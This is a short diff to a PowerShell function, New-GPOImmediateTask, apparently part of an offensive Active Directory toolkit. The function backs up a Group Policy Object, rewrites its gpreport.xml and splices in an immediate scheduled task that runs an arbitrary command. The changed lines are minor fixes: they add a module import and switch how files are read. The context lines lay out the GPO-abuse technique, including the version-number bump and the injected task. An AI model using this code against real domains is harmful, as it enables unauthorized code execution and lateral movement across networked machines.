@@ -75,6 +75,9 @@ function New-GPOImmediateTask {
     Write-Host "[*] CommandArguments:"$CommandArguments
     Write-Host "[*] TaskModifiedDate:"$TaskModifiedDate
 
+    Write-Host "`n[+] Start to import the module"
+    Import-Module GroupPolicy
+
     Write-Host "`n[+] Start to backup the GPO"
     $Command1 = (Backup-Gpo -Name $GPODisplayName -Path "./")
     $Command1 | Out-Null
@@ -91,7 +94,7 @@ function New-GPOImmediateTask {
      
     $GpreportPath = "./" + $BackupFolder + "/gpreport.xml"
                 
-    $Content1 = Get-Content $BackupxmlPath
+    $Content1 = [IO.file]::ReadAllText($BackupxmlPath)
     
     $String1 = "<UserExtensionGuids/>"
     $String2 = "<UserExtensionGuids><![CDATA[[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]]]></UserExtensionGuids>"
@@ -117,7 +120,8 @@ function New-GPOImmediateTask {
     Write-Host "[*] GpreportPath : "(Resolve-Path $GpreportPath).Path
         
     Write-Host "`n[+] Start to modify gpreport.xml"
-    $Content2 = Get-Content $GpreportPath
+    
+    $Content2 = [IO.file]::ReadAllText($GpreportPath)
               
     $Content2 = $Content2.replace("<VersionDirectory>0</VersionDirectory>","<VersionDirectory>6</VersionDirectory>")          
     $Content2 = $Content2.replace("<VersionSysvol>0</VersionSysvol>","<VersionSysvol>6</VersionSysvol>")      
@@ -197,7 +201,8 @@ function New-GPOImmediateTask {
     $tempdata1 = $tempdata1.replace("powershell",$Command)
     $tempdata1 = $tempdata1.replace('-c "123 | Out-File C:\test\debug.txt"',$CommandArguments)
         
-    $Content2 = $Content2.replace("</User>",$tempdata1)                         
+    $Content2 = $Content2.replace("</User>",$tempdata1)
+                         
     $Content2 | Set-Content -Encoding Unicode -Path $GpreportPath
             
     Write-Host "`n[+] Start to generate ScheduledTasks.xml"
